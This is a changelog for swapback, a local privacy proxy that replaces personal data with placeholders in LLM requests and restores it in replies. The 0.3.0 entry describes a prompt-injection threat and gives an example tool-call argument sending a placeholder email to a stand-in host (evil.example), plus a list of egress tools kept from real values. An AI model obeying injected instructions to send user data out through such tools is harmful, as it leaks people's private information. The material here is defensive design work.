# Changelog

All notable changes to this project are documented here. The format follows
[Keep a Changelog](https://keepachangelog.com/en/1.1.0/), and the project uses [Semantic Versioning](https://semver.org/).

## [0.4.2] - 2026-11-09

Fixes from an independent re-review against the launch bar.

### Security
- **Listed values with non-ASCII letters leaked when the text around them was JSON-escaped.** Python's `json.dumps`
  writes `Søren` as `S\u00f8ren`, so a listed accented name inside a tool result (OpenAI `tool`, Anthropic
  `tool_result`, Responses `function_call_output`) or in tool-call arguments kept in the history went to the provider
  as written, and the egress re-check missed it. swapback now also matches the decoded form of escaped text
  (`\uXXXX` in any hex case and surrogate pairs, `\xXX`, `\n` and the other JSON escapes, HTML entities such as
  `&oslash;` and `&#248;`, `%XX` runs, JSON inside JSON up to three levels) and swaps the escaped span it came from.
  The restore gives back the decoded spelling.
- **The egress re-check decodes the same escapes before checking**, so a listed value the swap misses in any spelling
  the model could decode blocks the request (`503`) instead of leaving.
- **A listed address written over two lines or without its comma** (`17 Example Mews\nDublin …`) is now matched:
  commas, semicolons and newlines separate the parts of listed values that are not names.

### Changed
- **Listed names that are also ordinary phrases** ("Will Hunt", "Rose Marsh") are matched only when every word is
  capitalised (`Will Hunt`, `WILL HUNT`, `Hunt, Will`), so "I will hunt for the keys" is left untouched. Set
  `common_names_title_case: false` for the old any-case matching. `check-config` still lists these names (line numbers,
  never values) and says which way they are matched.

### Added
- `swapback selftest` (`--json`): a reproducible leak test with made-up data shipped in the package. It sends 31 listed
  values in 90 written forms through 7 request paths to a recording fake model and prints listed values caught, forms
  leaked, ordinary sentences untouched, exact round trips and the unlisted catch rate. Exit code 0 on PASS. The README
  publishes its numbers.
- README: leads with the tool-call exfiltration threat and the `swapback demo` output, a "Use alongside LiteLLM or an
  NER tool" section, and comparison rows for the tool-call egress policy, Responses streams, fail-closed guards and a
  public leak test.

### Fixed
- A sharp shrink of the known file prints a warning line on stderr, and `/scrubber/health` reports
  `"status": "warning"` and `"ok": false` while the previous values are still being protected (`"status"` is `"ok"`,
  `"warning"` or `"blocked"`).
- `swapback check-config` exits with code 2 when the known file has no values (and `allow_empty_known` is not set).

## [0.4.1] - 2026-11-09

Fixes from an independent pre-launch review.

### Security
- **Listed phone numbers outside the US were sent unchanged.** A listed number with 10 digits, such as `98765 43210`
  (India) or `0412 345 678` (Australia), was expanded only into US formats and lost the form as written, so it went to
  the provider as written and the "known value still present" egress check missed it too. Now a listed phone is
  matched as written, by its bare digits, and by a digit matcher that finds the same national number in any grouping,
  with or without a country code or trunk 0 (`+91-98765-43210`, `(04) 1234 5678`). US formats are added only for
  numbers that are actually US. The egress re-check uses the same matcher, so a listed phone left anywhere in a
  request blocks it.
- **An empty or truncated known file no longer silently protects nothing.** A configured known file with no values
  blocks every request (`allow_empty_known: true` to allow it). A reload that finds the file empty or less than half
  its previous size keeps protecting the previous values too, alerts and shows a warning in `/scrubber/health`; at
  start, a file under half its size at the last start is flagged the same way.
- The known file and the config are re-read on any content change (mtime, size, inode or ctime, then a content hash),
  so a save by rename that keeps the old mtime is picked up.

### Added
- `swapback demo`: a built-in fake model plus the proxy, with made-up data and no config, key or network. It shows a
  plain, a streamed and a tool-call request: what the app sent, what the model saw, what came back. It is now the
  README's first step instead of the clone-only quickstart.
- Blocked requests answer in the client API's error shape (OpenAI or Anthropic) with a readable reason and the header
  `X-Swapback-Blocked`, and print one line on stderr. `/scrubber/health` has `warnings` and reports `ok: false` while
  an empty known file blocks requests.
- Listed names also match surname first (`Doe, Jane`) and without accents; listed IDs also match without their spaces
  and dashes. Variants share the value's placeholder and restore as written.
- Warnings in `swapback check-config`, the proxy's start line and `/scrubber/health`: example values from `swapback
  init` still in the known file, and listed names that are ordinary phrases (`Will Hunt` / "I will hunt"), by line
  number, never by value. `check-config` also notes listed phones that are not US numbers.

### Changed
- README: the `phone_regions` setting is explained (it is for the pattern detector, not for listed numbers).

## [0.4.0] - 2026-11-09

### Added
- **Hooks.** A `hooks:` section in `swapback.yaml` names a Python module (or a `.py` file, or a `swapback.hooks`
  entry point) whose optional functions run around each request: `before_forward` (reroute, change the body or
  headers, or answer directly), `on_upstream_response` (the upstream answered an error or was unreachable: try another
  route once), `on_usage` (each JSON reply and SSE event, for spend tracking), `on_complete`, `extra_routes` (extra GET
  endpoints) and `alert` (deliver alerts yourself). Hooks only ever see scrubbed requests and unrestored replies, so
  placeholders, never real values; rerouted and locally answered replies are restored like any other. Exceptions in
  `before_forward` and `on_upstream_response` fail closed with a 503. Use it for a spend cap with a local-model
  fallback, usage accounting or a health endpoint; see the README's "Hooks" section.
- `/scrubber/health` reports the hooks module and `hook_errors`; `swapback check-config` lists the hook functions.
- `swapback init` writes a starter `swapback.yaml`, `known.yaml` and `private_terms.example.yaml` (0600) from example
  files now shipped inside the package, so `pip install swapback` users have them; it never overwrites without
  `--force`.

### Changed
- README comparison table: the tool-call row now describes the `tool_restore` policy (it still said every tool got
  real values, the 0.2 behaviour), streaming lists the Responses API, and piighost and Kiji Privacy Proxy are added
  (claims from their own READMEs; "Unclear" where they do not say).
- README "Framework recipes": example `tool_restore` lists for OpenClaw, Claude Code, Codex CLI and a strict generic
  setup. Config only; swapback has no framework-specific code.

## [0.3.0] - 2026-11-09

### Security
- **Tool calls that could send data out keep their placeholders.** Until now the real values were restored into every
  tool call's arguments, so a prompt-injected model could ask a web or shell tool to send them anywhere, e.g.
  `{"url": "https://evil.example/c?d=«EMAIL_1»"}`. A new restore policy, `tool_restore` in `swapback.yaml`, keeps
  placeholders for tools whose names look like network or shell egress (`web_fetch`, `WebFetch`, `Bash`,
  `exec_command`, `http_request`, `send_email`, `git_push`, ...) and for any call with a URL in its arguments. `allow`
  lists tools that always get real values, `deny` tools that never do, `default: keep` keeps placeholders everywhere
  except allowed tools, and `tool_restore: false` restores everything as before. Applied to plain JSON replies, OpenAI
  chat streams and Anthropic `tool_use` blocks and streams. A streamed call whose name does not decide is held until
  it is complete. Each kept call is counted as `tool_kept` in `requests.jsonl` (a count, never a value), and
  `swapback check-config` shows the policy. See the README's "Tool calls" section.
- The top-level `user` field is now scrubbed (it was skipped, with only a known-value check). `metadata`,
  `instructions`, `safety_identifier` and other free-text fields were already scrubbed; tests now cover them.

### Added
- `swapback known init` builds or extends `known.yaml` from a vCard export (2.1, 3.0, 4.0), a CSV (Google and Outlook
  contact exports, any name/email/phone/address columns, or value,type rows) and other known files. It merges without
  duplicates (case, spacing and phone formats), writes the file `0600`, skips one-word contacts that are relations or
  everyday words, and prints counts only (`--show` for values, `--dry-run` to write nothing). `--scan` reads past
  prompts (text or JSONL) and writes candidate names, emails and phones to a separate `known.suggestions.yaml` for
  review; suggestions are never merged on their own. Standard library only.

- OpenAI Responses API streams (`/v1/responses` with `stream: true`, as used by Codex) are restored: `output_text`,
  refusal and reasoning deltas with the same split-placeholder handling as chat completions,
  `function_call_arguments` and `custom_tool_call_input` deltas under the tool restore policy, and the `.done`,
  `output_item.*`, `content_part.*` and `response.completed` snapshots. A held-back piece is sent as one more delta
  before the matching `.done` event, and `sequence_number`s are shifted so they stay unique and increasing. Codex's
  `local_shell_call` always keeps placeholders.
- PyPI packaging: `python -m build` makes a clean sdist (with tests and fixtures) and wheel that pass
  `twine check --strict`; CI checks this on every push. A `release` workflow builds and tests the wheel on a `v*` tag
  and publishes with PyPI Trusted Publishing once the repository variable `PYPI_PUBLISH` is `true`. Not published yet.

### Changed
- The "keep placeholders as written" system note now also reaches requests without a system message (a system message
  is added, but only when the request carries placeholders), a system or `developer` message with content parts,
  Anthropic's top-level `system` (string or blocks; a block is appended after any `cache_control` block) and the
  Responses API `instructions`. Before, it was only appended to a string system message.
- The proxy tells the scrubber which API a request is for (`/v1/messages` = Anthropic, `/v1/responses` = Responses)
  so the note goes in the right place.

- Package metadata: SPDX `license = "MIT"` with `license-files` (setuptools 77 or newer to build), vendor rule
  sets declared as packages, more keywords. README links and images are absolute so they also work on PyPI.
- README: Responses API streams moved from "doesn't catch yet" to restored; the stale "203 tests" line no longer
  carries a count. SECURITY.md: 0.3.x is the supported line.

### Upgrading
- If one of your egress-named tools must receive real values (your own mail tool, say), add it to
  `tool_restore.allow`. Otherwise it now receives placeholders.

## [0.2.1] - 2026-11-09

### Added
- `--help` (`-h`) and `--version` on both commands. `swapback-proxy --help` says what the proxy does, which config it
  reads (`SWAPBACK_CONFIG`, with the deprecated `PII_SCRUBBER_CONFIG` fallback), how to change the listen address
  (`SWAPBACK_LISTEN` or `listen:`), and points to `swapback check-config` and `swapback health`.
  `swapback COMMAND --help` describes each command.

### Changed
- README: a short "What it doesn't catch yet" list at the top of Limits, checked against this release (unlisted names,
  most date-of-birth forms, non-US national IDs, most non-US addresses, free-form secrets, Responses API streams).
- SECURITY.md: 0.2.x is the supported line, and reporters without the private-report button are asked to open an
  issue requesting a private contact, with no details.
- CI: `actions/checkout@v7` and `actions/setup-python@v7` (Node 24), so the runs no longer print the Node 20
  deprecation warning.

### Fixed
- `swapback-proxy --help`, or any other argument, started the proxy on 127.0.0.1:8787. Help and version now print and
  exit without loading the config or opening a port; an unknown option or argument prints the usage and exits with
  status 2. With no arguments the proxy starts as before.
- `swapback` with an unknown command printed the module notes and exited 0; it now prints the usage and an error and
  exits 2. `--help` no longer needs a loadable config.

## [0.2.0] - 2026-11-09

### Changed
- **Renamed from pii-scrubber to swapback.** The package is now `swapback` (`import swapback`), the commands are
  `swapback` and `swapback-proxy`, the environment variables are `SWAPBACK_*`, the config file is `swapback.yaml`
  (example: `swapback.example.yaml`), the default state directory is `~/.local/state/swapback`, and the repository is
  `github.com/rmpmrepo1278/swapback`. The old `PII_SCRUBBER_*` variables are still read as a fallback when the new one
  is unset (deprecated). Move an existing state directory by hand if you want to keep its vault. The `«PERSON_1»`
  placeholder format is unchanged. The 0.1.1 fixes below ship in this release.


### Fixed
- **Flaky proxy test (CI, Python 3.13).** The proxy tests picked two "free" ports by binding and releasing them, and the kernel can hand the same port back twice (4 in 100,000 tries on Linux). When the proxy's port equalled the mock upstream's, the proxy could not start and the test talked to the mock directly, which looked like a leak. Each test now gets its own mock upstream on a kernel-picked port with its own list of received requests, the proxy listens on port 0 and reports its port, and the fixture fails loudly unless the scrubber itself answers. The proxy code was not at fault; new tests pin every `/v1/completions` prompt shape (string, list, nested, token ids; streamed or not).
- **Anthropic Messages streams are restored.** `/v1/messages` SSE replies get their placeholders swapped back delta by
  delta (`text_delta`, and `input_json_delta` for `tool_use` input), including a placeholder split across deltas; held
  text is flushed before its `content_block_stop`. Before, agents in Anthropic mode showed `«PERSON_1»` in replies.
- **Written variants of a known value no longer leak.** A listed multi-word value is also matched when its words are
  joined by any whitespace run (non-breaking, repeated, tabs), zero-width characters, `.`, `_`, `-` or `%20`, and the
  post-swap egress re-check uses the same rule, so a variant that slips is blocked (`503`). Private terms use the same rule.
- **All-caps and other case variants are the same person.** Every variant of a listed value or private term shares one
  placeholder (before, `JANE DOE` became a second `«PERSON_n»`). The reply still gets back the exact form that was
  written, from a per-request record of surface forms (`Forms`).

### Added
- `evals/run_holdout.py` and a regression test: the patterns-only score on `evals/holdout3.json`, published in the
  README (10/42 positives in 0.1.0, 16/42 in 0.1.1; 22/22 negatives untouched; 64/64 exact round trips).
- Generic detection rules: emails written with bracketed at/dot (`name [at] example [dot] org`, `name(at)example.org`),
  with a full-width or small `@` or hidden zero-width characters; IPv6 addresses (validated, loopback skipped).
- README: setup for a real provider (copy the example files, set `private_terms_file`, edit `known.yaml` before
  starting, `upstream` is a base URL without `/v1`), "Use with agents" with a tested OpenClaw provider block, what a
  block looks like inside an agent, and how to check what the provider saw.

### Changed
- `evals/holdout3.json`: the one SSN-shaped value now uses the reserved 987-65-43xx range.

### Added (docs release)
- README rewrite: quickstart, architecture, configuration, comparison with similar projects, limits, security notes.
- Logo, banner, architecture and before/after graphics in `docs/assets/`.
- `examples/quickstart.yaml`, `examples/known.demo.yaml` and `examples/curl_demo.sh`.
- CONTRIBUTING, SECURITY, CODE_OF_CONDUCT, issue and pull request templates.
- GitHub Actions workflow running the tests and the smoke test on Python 3.11, 3.12 and 3.13.
- `evals/holdout3.json`: 64 synthetic detection cases.

## [0.1.0] - 2026-11-08

### Added
- OpenAI-compatible HTTP proxy (`swapback-proxy`) that swaps known values and detected PII for stable placeholders
  before a request leaves the machine and restores them in the reply: plain JSON, OpenAI chat-completion SSE streams and
  tool-call arguments.
- Known-values file with typed entries and written-variant matching; private terms and money figures.
- Detectors: `phonenumbers`, Microsoft Presidio predefined patterns, gitleaks default secret rules, local rules.
- Fail-closed behaviour: scrub errors, unreadable bodies and known values left after the swap answer `503`.
- File-path exemption for known names that are path segments.
- Local vault (mode 0600), counts-only request log, health endpoint, alert webhook, `canary` self-test, CLI.

### Fixed
- JSON request bodies are scrubbed whatever their `Content-Type`.
- Restored values are returned exactly as written (for example a phone number keeps its original format).
